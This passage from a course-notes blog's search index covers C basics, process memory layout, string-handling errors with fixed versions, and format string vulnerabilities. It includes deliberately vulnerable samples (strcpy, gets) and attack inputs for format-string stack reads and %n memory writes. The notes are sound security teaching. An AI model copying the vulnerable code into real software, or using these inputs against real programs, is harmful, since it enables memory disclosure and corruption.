only</li>\n</ul>\n<ol start=\"4\">\n<li>libFuzzer: Guided Fuzzing for APIs<br>\nThe other top general purpose fuzzer\n<ul>\n<li>Use similar algorithms to AFL</li>\n<li>Build it with special compiler instrumentation (LLVM)<br>\nTargets functions rather than programs</li>\n<li>Testers have to write a harness</li>\n</ul>\n</li>\n</ol>\n","categories":["课程笔记","Principles of Software Security"],"tags":["C","software security","AFL","Linux"]},{"title":"C language basics and Computer memory","url":"/course/C-language-basics-and-Computer-memory/","content":"<h1 id=\"C language basics\" class=\"active\"><a class=\"anchor\"  href=\"#C language basics\">#</a>C language basics</h1>\n<h2 id=\"input/output\" class=\"active\"><a class=\"anchor\"  href=\"#input/output\">#</a> input/output</h2>\n<ol>\n<li>To print output to the terminal screen:</li>\n</ol>\n<ul>\n<li>printf(“Hello\\n”);</li>\n<li>printf(“Hello %s”, “haxor”);  // using a format string</li>\n</ul>\n<ol start=\"2\">\n<li>To get input from the user:</li>\n</ol>\n<ul>\n<li>scanf(&quot;%d&quot;, &amp;number);</li>\n</ul>\n <figure class=\"highlight c\"><figcaption><span>Input/output format symbols</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;test\\n&quot;</span>);   <span class=\"comment\">// `\\n`:  Carriage return/new line</span></span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;test %d&quot;</span>, <span class=\"number\">123</span>);  <span class=\"comment\">//`%d`:  Decimal value</span></span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;test %s&quot;</span>, <span class=\"string\">&quot;123&quot;</span>);  <span class=\"comment\">//`%s`:  String value</span></span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;test %x&quot;</span>, <span class=\"number\">0x123</span>);  <span class=\"comment\">//`%x`:  Hex value</span></span><br></pre></td></tr></table></figure>\n <figure class=\"highlight c\"><figcaption><span>C Program takes command-line arguments</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//meet.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\">greeting(<span class=\"type\">char</span> *temp1, <span class=\"type\">char</span> *temp2) <span class=\"comment\">// greeting function to say hello</span></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">400</span>];  <span class=\"comment\">// string variable to hold the name</span></span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(name, temp2);  <span class=\"comment\">// copy function argument to name</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello %s %s\\n&quot;</span>, temp1, name);  <span class=\"comment\">// print out the greeting</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">main(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[]) <span class=\"comment\">// note the format for arguments</span></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    greeting(argv[<span class=\"number\">1</span>], argv[<span class=\"number\">2</span>]);  <span class=\"comment\">// call function, pass title &amp; name</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Bye %s %s\\n&quot;</span>, argv[<span class=\"number\">1</span>], argv[<span class=\"number\">2</span>]);  <span class=\"comment\">// say “bye&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Compiling C programs\" class=\"active\"><a class=\"anchor\"  href=\"#Compiling C programs\">#</a> Compiling C programs</h2>\nCompiling C programs(Linux) Using gcc\n<ol>\n<li>To compile our  <code>meet.c</code>  program, type</li>\n</ol>\n <figure class=\"highlight bash\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$gcc</span> -o meet meet.c</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>Then to execute the new program, type</li>\n</ol>\n <figure class=\"highlight bash\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">$ ./meet zz</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>Commonly used gcc flags</li>\n</ol>\n<ul>\n<li>-o <filename>: produces compiled binary file with filename (a.out by default).</li>\n<li>-S: produces assembly code in a file; saved with a .s extension</li>\n<li>-g, -ggdb: produces extra debugging information for gdb (GNU debugger)</li>\n<li>-c: compiles without linking; produces object files with an .o extension</li>\n<li>Check out manual by using: man gcc</li>\n</ul>\n<ol start=\"4\">\n<li>32-bit vs 64-bit compilation</li>\n</ol>\n<ul>\n<li>To compile into 32-bit binaries:</li>\n</ul>\n <figure class=\"highlight bash\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$gcc</span> -m32 hello.c -o hello</span><br></pre></td></tr></table></figure>\n<ul>\n<li>install a standard library of</li>\n</ul>\n <figure class=\"highlight bash\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sudo</span> apt install gcc-multilib </span><br></pre></td></tr></table></figure>\n<h2 id=\"C vs C#\" class=\"active\"><a class=\"anchor\"  href=\"#C vs C#\">#</a> C vs C#</h2>\n<ol>\n<li>C# is type-safe</li>\n</ol>\n<ul>\n<li>Strong static type system + runtime checks (e.g. bounds, type casts) + automatic memory management</li>\n</ul>\n<ol start=\"2\">\n<li>C is type-unsafe</li>\n</ol>\n<ul>\n<li>Pointers + no runtime check (out-of-bound access, bad type casts), manual memory management<br>\nRuntime array bounds check in C#</li>\n</ul>\n<p>If the following C# code is executed on .NET:</p>\n <figure class=\"highlight c#\"><figcaption><span>(●ˇ∀ˇ●)</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span> arr[<span class=\"number\">10</span>];</span><br><span class=\"line\"> arr[<span class=\"number\">10</span>] = <span class=\"number\">50</span>;</span><br></pre></td></tr></table></figure>\n<p>An exception will be raised at runtime!</p>\n<p>The length of the array is recorded and checked by the runtime</p>\n<ul>\n<li>The length of an array is fixed once created</li>\n</ul>\n<p>No runtime array bounds check in C, If the same C code is executed:</p>\n <figure class=\"highlight c\"><figcaption><span>(●ˇ∀ˇ●)</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> arr[<span class=\"number\">10</span>];</span><br><span class=\"line\"> arr[<span class=\"number\">10</span>] = <span class=\"number\">50</span>;</span><br></pre></td></tr></table></figure>\n<p>No error, result in a silent buffer overflow!</p>\n<ul>\n<li>Unexpected behaviours such as mysterious crashes depending on what was overwritten</li>\n<li>Attackers may exploit this if they can control the overwritten data</li>\n</ul>\n<ol start=\"3\">\n<li>Automatic memory management in C#</li>\n</ol>\n<p>Programmers do not write code to perform memory management tasks<br>\nGarbage collector manages the allocation and release of memory<br>\nC# has no common memory problems such as buffer overflow</p>\n<ol start=\"4\">\n<li>C# strings</li>\n</ol>\n<p>C# strings are  <code>objects</code>  of the  <code>String</code>  class</p>\n<ul>\n<li>Similar to an array of chars, but immutable</li>\n<li>The length is stored on the object for bounds checks at runtime</li>\n</ul>\n<p>All string manipulation operations do not modify the original string</p>\n<ul>\n<li>A new string is created upon modification</li>\n<li>For example,  <code>str.Trim()</code>  returns a new string</li>\n</ul>\n<ol start=\"5\">\n<li>C strings</li>\n</ol>\n<p>C strings are arrays of characters</p>\n<ul>\n<li>Terminated by and including the first occurrence of the null character  <code>\\0</code></li>\n</ul>\n<p>String length is not automatically tracked</p>\n<ul>\n<li>It is determined by the number of bytes (character) preceding the null character.</li>\n<li>The memory required to store a string is the number of characters plus one</li>\n</ul>\n<p>A string can be manipulated just like any other arrays</p>\n<ul>\n<li>We usually use some built-in string functions in C libraries</li>\n</ul>\n <figure class=\"highlight c\"><figcaption><span>copy one string to another</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span>    <span class=\"comment\">// use string library     </span></span></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"type\">char</span> str1[] = <span class=\"string\">&quot;Hello, Z&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> str2[<span class=\"number\">20</span>];</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str2, str1);  <span class=\"comment\">// copy each character in str1 into str2</span></span><br></pre></td></tr></table></figure>\n<p>The function  <code>strcpy</code>  copies each character in the source string (a series of characters ending with and including a null character) into the destination string</p>\n <figure class=\"highlight c\"><figcaption><span>To compare two strings</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> str1[] = <span class=\"string\">&quot;hello&quot;</span>;</span><br><span class=\"line\"> <span class=\"type\">char</span> str2[] = <span class=\"string\">&quot;haxor&quot;</span>;</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(str1, str2) == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Strings are the same.\\n&quot;</span>);</span><br><span class=\"line\"> <span class=\"keyword\">else</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Strings are different.\\n&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>This code prints out: Strings are different.<br>\nNote that the function  <code>strcmp()</code>  does not return a  <code>boolean</code>  result</p>\n<ul>\n<li>Zero represents false, anything else represents true</li>\n<li>No  <code>boolean</code>  type in C language prior to C99</li>\n</ul>\n<ol start=\"6\">\n<li><strong>Other common string functions</strong> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpYm9va3Mub3JnL3dpa2kvQ19Qcm9ncmFtbWluZy9TdHJpbmdfbWFuaXB1bGF0aW9u\">More can be found</span><br>\n <code>strlen</code> : gets the length of a string<br>\n <code>strncpy</code> : copies one string to another with a bound<br>\n <code>strcat</code> ,  <code>strncat</code> : string concatenation<br>\n <code>gets</code> ,  <code>fgets</code> : receives input into a string</li>\n</ol>\n<h2 id=\"C strings is error prone\" class=\"active\"><a class=\"anchor\"  href=\"#C strings is error prone\">#</a>C strings is error prone</h2>\n<ol>\n<li>Common string manipulation errors:</li>\n</ol>\n<ul>\n<li>Buffer errors</li>\n<li>Heap errors</li>\n<li>Out‐by‐bound errors</li>\n<li>Integer overflows</li>\n<li>Other memory, pointer and type errors</li>\n</ul>\n<p><strong>When data is copied from an unbounded source to a fixed‐length sink</strong></p>\n <figure class=\"highlight c\"><figcaption><span>Unbounded string copy</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> \t<span class=\"type\">char</span> username[<span class=\"number\">8</span>];</span><br><span class=\"line\"> \t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Please enter your username:&quot;</span>);</span><br><span class=\"line\"> \tgets(username);</span><br><span class=\"line\"> \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your username is %s\\n&quot;</span>, username);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Use of  <code>gets()</code>  Function</li>\n</ul>\n<p>The function  <code>gets()</code>  reads input from the user into a buffer, but it does not check the length of the input against the buffer’s size.<br>\nIn this code, the  <code>username</code>  array is only 8 bytes long. However,  <code>gets()</code>  allows users to enter an input of any length, which means it can write beyond the 8 bytes allocated for  <code>username</code> .<br>\nThis can cause a buffer overflow, which can lead to memory corruption, unexpected behavior, or even security vulnerabilities where attackers can execute arbitrary code.</p>\n<ul>\n<li>Fixed-Length Buffer</li>\n</ul>\n<p>The username array is declared to have a size of 8, but we need to reserve one byte for the null-terminator  <code>\\0</code> , which marks the end of the string.<br>\nThis means only 7 characters can safely be stored in the username buffer.<br>\nIf the input exceeds this limit, it will overflow into adjacent memory, potentially causing the program to crash or behave unpredictably.</p>\n <figure class=\"highlight c\"><figcaption><span>Unbounded string copy(fixed)</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> username[<span class=\"number\">8</span>];  <span class=\"comment\">// Buffer limited to 8 bytes</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Please enter your username:&quot;</span>);</span><br><span class=\"line\">    fgets(username, <span class=\"keyword\">sizeof</span>(username), <span class=\"built_in\">stdin</span>);  <span class=\"comment\">// Limit input size to prevent overflow</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your username is %s\\n&quot;</span>, username);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;  <span class=\"comment\">// Standard return type</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>Better string functions from libraries</strong><br>\nShould use functions that restrict the number of bytes for safer programming</p>\n<ul>\n<li>Use  <code>fgets()</code> , instead of  <code>gets()</code></li>\n<li>Use  <code>strncpy()</code> , instead of  <code>strcpy()</code></li>\n<li>Use  <code>strncat()</code> , instead of  <code>strcat()</code></li>\n<li>Use  <code>snprintf()</code> , instead of instead of  <code>sprintf()</code></li>\n</ul>\n<p><strong>Null‐termination errors</strong></p>\n <figure class=\"highlight c\"><figcaption><span>Null‐termination errors</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> arr[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">strncpy</span>(arr, <span class=\"string\">&quot;0123456789&quot;</span>, <span class=\"keyword\">sizeof</span>(arr));</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, arr);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>The array is not properly terminated by a null character!</p>\n<ul>\n<li>When there is no null character among the first n character of the source, the string placed in the<br>\ndestination will not be null-terminated!<br>\nThe  <code>printf()</code>  call prints out all bytes as character till reaching a null!</li>\n</ul>\n<p>To test out, let’s add another array:</p>\n <figure class=\"highlight c\"><figcaption><span>Null‐termination errors</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> arr[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"type\">char</span> arr2[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">strncpy</span>(arr, <span class=\"string\">&quot;0123456789&quot;</span>, <span class=\"keyword\">sizeof</span>(arr));</span><br><span class=\"line\">\t<span class=\"built_in\">strncpy</span>(arr2, <span class=\"string\">&quot;9876543210&quot;</span>, <span class=\"keyword\">sizeof</span>(arr2));</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, arr);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>The program will print out 01234567899876543210<br>\nWhere the length of source string is the same or greater than the length of target string</p>\n<ul>\n<li>The source string gets truncated</li>\n<li>The target string may not be properly terminated by null!</li>\n</ul>\n<p>How can we fix it?<br>\nManually add a null character at the end of the target string:</p>\n <figure class=\"highlight c\"><figcaption><span>Null‐termination errors(fixed)</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> arr[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">strncpy</span>(arr, <span class=\"string\">&quot;0123456789&quot;</span>, <span class=\"keyword\">sizeof</span>(arr)<span class=\"number\">-1</span>);</span><br><span class=\"line\">\tarr[<span class=\"keyword\">sizeof</span>(arr)<span class=\"number\">-1</span>] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, arr);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>The function char  <code>*fgets(char *str, int n, FILE *stream)</code>  reads  <code>(n-1)</code>  characters from the specific stream plus the final null character</p>\n<h1 id=\" Computer memory\" class=\"active\"><a class=\"anchor\"  href=\"# Computer memory\">#</a> Computer memory</h1>\n<h2 id=\" Intel x86 (32-bit)\" class=\"active\"><a class=\"anchor\"  href=\"# Intel x86 (32-bit)\">#</a> Intel x86 (32-bit)</h2>\n<ol>\n<li>von Neumann architecture</li>\n</ol>\n<ul>\n<li>\n<p>Central processing unit (CPU) executes code</p>\n</li>\n<li>\n<p>Main memory of the system (RAM) stores all data and code</p>\n</li>\n<li>\n<p>Input/output system (I/O) interfaces with devices such as hard drives, keyboards, and monitors</p>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/24/671a56f0c953f.png\" alt=\"img\"></p>\n</li>\n</ul>\n<ol start=\"2\">\n<li>CPU</li>\n</ol>\n<p>The <strong>control unit</strong> gets instructions to execute from RAM using the instruction pointer, which stores the address of the instruction to execute<br>\n<strong>Registers</strong> are the CPU’s basic data storage units and are often used to save time so that the CPU doesn’t need to access RAM.</p>\n<p>在 32 位 x86 架构中，主要的通用寄存器包括：</p>\n<ul>\n<li>EAX: 累加器寄存器，用于算术运算和返回值。</li>\n<li>EBX: 基址寄存器，常用于基址存取。</li>\n<li>ECX: 计数器寄存器，常用于循环和移位操作。</li>\n<li>EDX: 数据寄存器，用于 I/O 操作和乘除法。</li>\n<li>ESI: 源索引寄存器，常用于指向内存数据源。</li>\n<li>EDI: 目标索引寄存器，常用于指向内存数据目标。</li>\n<li>EBP: 基址指针寄存器，用于栈帧基址指针。</li>\n<li>ESP: 栈指针寄存器，指向当前栈顶</li>\n</ul>\n<p>The <strong>Arithmetic Logic Unit (ALU)</strong> executes an instruction fetched from RAM and places the results in registers or memory</p>\n<p>CPU runs a program by fetching and executing each instruction</p>\n<h2 id=\"Programs in the main memory\" class=\"active\"><a class=\"anchor\"  href=\"#Programs in the main memory\"> #</a>  Programs in the main memory</h2>\n<p>Processes are programs loaded into memory, broken into small sections</p>\n<ul>\n<li>\n<p>.text section</p>\n</li>\n<li>\n<p>.data section</p>\n</li>\n<li>\n<p>.bss section</p>\n</li>\n<li>\n<p>Heap section</p>\n</li>\n<li>\n<p>Stack section</p>\n</li>\n<li>\n<p>Environment/Arguments section</p>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/24/671a56f09cb3d.png\" alt=\"img\"></p>\n</li>\n</ul>\n<ol>\n<li>.text section</li>\n</ol>\n<p>Correspond to the .text portion of the binary executable file.</p>\n<p>Contain the machine instructions to get the task done</p>\n<ol start=\"2\">\n<li>.data section</li>\n</ol>\n<p>Store global initialised variables such as:</p>\n<ul>\n<li>int a = 0;</li>\n</ul>\n<ol start=\"3\">\n<li>.bss section</li>\n</ol>\n<p>Store global uninitialised variables such as:</p>\n<ul>\n<li>int a;</li>\n</ul>\n<ol start=\"4\">\n<li>Heap section</li>\n</ol>\n<p>Store dynamically allocated variables</p>\n<ul>\n<li>Contain the pre-existing value of that memory</li>\n</ul>\n<p>Grows from the lower-addressed memory to the higher-addressed memory</p>\n<ul>\n<li>int *I = malloc (sizeof (int));</li>\n</ul>\n<ol start=\"5\">\n<li>Stack section</li>\n</ol>\n<p>Keep track of function calls (recursively)</p>\n<p>Grow from the higher-addressed memory to the lower-addressed memory</p>\n<p>Local variables are in the stack section</p>\n<ol start=\"6\">\n<li>Environment/Arguments section</li>\n</ol>\n<p>Store a copy of system-level variables that may be required by the process</p>\n<ul>\n<li>For example, path, shell name, hostname, etc.</li>\n</ul>\n<p>Command-line arguments are stored in this area.</p>\n<h2 id=\" Buffers\" class=\"active\"><a class=\"anchor\"  href=\"# Buffers\">#</a> Buffers</h2>\n<p>A storage place used to receive and hold data until it can be handled by a process<br>\nEach process can have its own set of buffers</p>\n<ul>\n<li>E.g. memory allocated within the .data or .bss section of the process’s memory<br>\nBuffer is of <strong>fixed length once allocated</strong>.</li>\n<li>Hold any predefined type of data</li>\n</ul>\n<h2 id=\" Pointers\" class=\"active\"><a class=\"anchor\"  href=\"# Pointers\">#</a> Pointers</h2>\n<p>Pointers hold the address of other pieces of memory</p>\n<ul>\n<li>Their size is fixed of 4 bytes for 32-bit memory address</li>\n</ul>\n<p>C string can be written as a pointer to character:</p>\n<ul>\n<li>char * str;</li>\n<li>int * point1;</li>\n</ul>\n<p>C#’s reference types implicitly use pointers<br>\nUse dereference to read the value inside the memory address pointed to by the pointer:</p>\n<ul>\n<li>printf(&quot;%d&quot;, *point1);</li>\n</ul>\n<p>The  <code>*</code>  symbol dereferences the pointer called point1 and displays the value of the integer using the  <code>printf()</code>  function</p>\n<ul>\n<li>The type of  <code>point1</code>  is a pointer</li>\n<li>The type of  <code>*point1</code>  is an integer</li>\n</ul>\n <figure class=\"highlight c\"><figcaption><span>Putting the pieces of memory together</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> ind = <span class=\"number\">5</span>;                     <span class=\"comment\">// integer stored in .data (initialized)</span></span><br><span class=\"line\"> <span class=\"type\">char</span> *str;                       <span class=\"comment\">// string pointer stored in .bss (uninitialized)</span></span><br><span class=\"line\"> <span class=\"type\">int</span> nothing;                     <span class=\"comment\">// integer stored in .bss (uninitialized)</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"type\">void</span> <span class=\"title function_\">fun</span><span class=\"params\">(<span class=\"type\">int</span> c)</span> </span><br><span class=\"line\">&#123;                                              </span><br><span class=\"line\"> \t<span class=\"type\">int</span> i = c;                                  <span class=\"comment\">// stored in stack section</span></span><br><span class=\"line\"> \tstr = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">10</span> * <span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span>));    <span class=\"comment\">// reserves 10 characters in heap region </span></span><br><span class=\"line\"> \t<span class=\"built_in\">strncpy</span>(str, <span class=\"string\">&quot;abcde&quot;</span>, <span class=\"number\">5</span>);                   <span class=\"comment\">// copies &quot;abcde&quot; into str</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\tfun(<span class=\"number\">1</span>); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":["课程笔记","Principles of Software Security"],"tags":["software security","Linux","C language"]},{"title":"Format string bugs","url":"/course/Format-string-bugs/","content":"<h1 id=\"Format Functions\" class=\"active\"><a class=\"anchor\"  href=\"#Format Functions\">#</a>Format Functions</h1>\n<ol>\n<li>Format Functions</li>\n</ol>\n<ul>\n<li><code>printf</code>  Output a formatted string</li>\n<li><code>fprintf</code>  Writes the printf to a file</li>\n<li><code>sprintf</code>  Prints into a string</li>\n<li><code>snprintf</code>  Prints into a string checking the length</li>\n<li><code>vprintf</code>  Prints the argument list to stdout</li>\n<li><code>vfprintf</code>  Prints the argument list to a file</li>\n<li><code>vsprintf</code>  Prints the argument list to a string</li>\n<li><code>vsnprintf</code>  Prints the argument to a string checking the length<br>\n 总结： <code>printf</code>  和  <code>fprintf</code>  用于输出格式化字符串到标准输出或文件。<br>\n <code>sprintf</code>  和  <code>snprintf</code>  用于将格式化字符串写入字符串缓冲区， <code>snprintf</code>  更安全。<br>\n <code>vprintf</code> 、 <code>vfprintf</code> 、 <code>vsprintf</code>  和  <code>vsnprintf</code>  用于处理可变参数列表，与前面的函数类似，但专门用于  <code>va_list</code>  参数的处理。</li>\n</ul>\n<ol start=\"2\">\n<li>Format Strings</li>\n</ol>\n<ul>\n<li>Format String is the argument of format functions that contains format parameters. Format parameters are placeholders to be replaced with user inputs</li>\n<li>For example, the statement will output different sentences, depending on what is contained in the variable name:  <code>printf(&quot;Hello, %s.&quot;, &amp;name);</code></li>\n<li>If the variable name contains the string “Zz”, then  <code>printf()</code>  will output: Hello, Zz.</li>\n</ul>\n<ol start=\"3\">\n<li>Common Parameters Used in Format String Attacks</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>描述</th>\n<th>传递方式</th>\n<th>在攻击中的作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>%s</td>\n<td>打印字符串</td>\n<td>引用（指向字符串的指针）</td>\n<td>攻击者可以利用 % s 打印出内存中的任意数据，通过提供特定的内存地址，读取敏感数据（如密码、密钥等）。</td>\n</tr>\n<tr>\n<td>%d</td>\n<td>打印有符号十进制整数</td>\n<td>整数值</td>\n<td>虽然 % d 通常用于整数显示，但攻击者可以通过它来泄露内存中的整数值。</td>\n</tr>\n<tr>\n<td>%u</td>\n<td>打印无符号十进制整数</td>\n<td>无符号整数值</td>\n<td>与 % d 类似，但用于无符号整数的显示。</td>\n</tr>\n<tr>\n<td>%x</td>\n<td>打印十六进制整数（小写）</td>\n<td>无符号整数值</td>\n<td>攻击者可以通过 % x 逐步读取内存，以十六进制显示地址中的数据内容。</td>\n</tr>\n<tr>\n<td>%c</td>\n<td>打印单个字符</td>\n<td>字符值</td>\n<td>用于显示单个字符，但在攻击中用途有限。</td>\n</tr>\n<tr>\n<td>%n</td>\n<td>将已打印的字符数写入指定变量</td>\n<td>引用（指向整数的指针）</td>\n<td>攻击者可以利用 % n 修改任意内存地址的值，这是格式字符串攻击中最危险的参数之一，可能被用来修改程序的控制流。</td>\n</tr>\n<tr>\n<td>%%</td>\n<td>打印 % 字符</td>\n<td>无</td>\n<td>用于输出 % 字符，无特别的攻击价值。</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"4\">\n<li>How Do Format Functions Work?<br>\nAccording to the data format dictated by the format parameters, format functions retrieve the arguments from the stack</li>\n</ol>\n<ul>\n<li>printf(“A is the number %d, B is the string %s”, A, &amp;B);<br>\nThe  <code>printf()</code>  function will attempt to retrieve the value of A and the address of string B from the stack<br>\n 在格式化字符串中，每个格式参数（如  <code>%d</code> 、 <code>%s</code> ）都告诉  <code>printf()</code>  如何解释栈中的数据： <code>%d</code>  表示检索一个 整数值。 <code>%s</code>  表示检索一个 字符串指针（地址），然后根据地址打印对应的字符串。</li>\n</ul>\n<h1 id=\"Exploit\" class=\"active\"><a class=\"anchor\"  href=\"#Exploit\">#</a>Exploit</h1>\nThe vulnerability occurs when there is a mismatch between the number of format parameters and the number of function arguments provided to fill those places \n- For example, if an attacker is able to supply more placeholders than there are arguments, he/she can use format functions to read or write the stack! \nFormat functions can be exploited when an attacker is given direct control over the format string fed into the function\n<ol>\n<li>Reading Data from Stack</li>\n</ol>\n<ul>\n<li>printf(&quot;A is the number  <code>%d</code> , reading stack data:  <code>%x</code> &quot;, A);\n<ul>\n<li><code>printf()</code>  will attempt to retrieve two values from the stack</li>\n<li>But only one of those is placed on the stack</li>\n<li><code>printf()</code>  will retrieve the next value on the stack and display it in hex format!</li>\n</ul>\n</li>\n<li>To print the next 20 items on the stack:\n<ul>\n<li>printf(&quot;%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x&quot;);</li>\n</ul>\n</li>\n<li>To print the tenth element next on the stack:\n<ul>\n<li>printf(&quot;%10$x&quot;);</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Reading Data at Arbitrary Location  <code>%s</code></li>\n</ol>\n<ul>\n<li>Format functions treat the data on the stack as an address to go fetch a string\n<ul>\n<li>Note that  <code>%s</code>  is passed as reference!</li>\n</ul>\n</li>\n<li>How to control the address accessed by  <code>%s</code> ?\n<ul>\n<li>Place an address on the format string (the string is stored on stack)</li>\n<li>Get  <code>%s</code>  to dereference it!</li>\n</ul>\n</li>\n<li>To print the string located at address 0x12345678:\n<ul>\n<li>printf(&quot;\\x78\\x56\\x34\\x12%x%x%x%s&quot;, A, B, C);</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Writing Data at Arbitrary Location  <code>%n</code></li>\n</ol>\n<ul>\n<li><code>%n</code>  stores the number of characters written so far into the corresponding function argument! For example, the following code put the integer 5 into the variable  <code>num_char</code></li>\n</ul>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> num_char; </span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;11111%n&quot;</span>, &amp;num_char); </span><br></pre></td></tr></table></figure>\n<p>With width-controlling format parameters, the attacker can write arbitrary integers to the location pointed to by the function argument</p>\n<ul>\n<li>Write 10 to num_char using width-controlling format parameter</li>\n</ul>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> num_char; </span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%10d%n&quot;</span>, <span class=\"number\">0</span>, &amp;num_char);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Control the 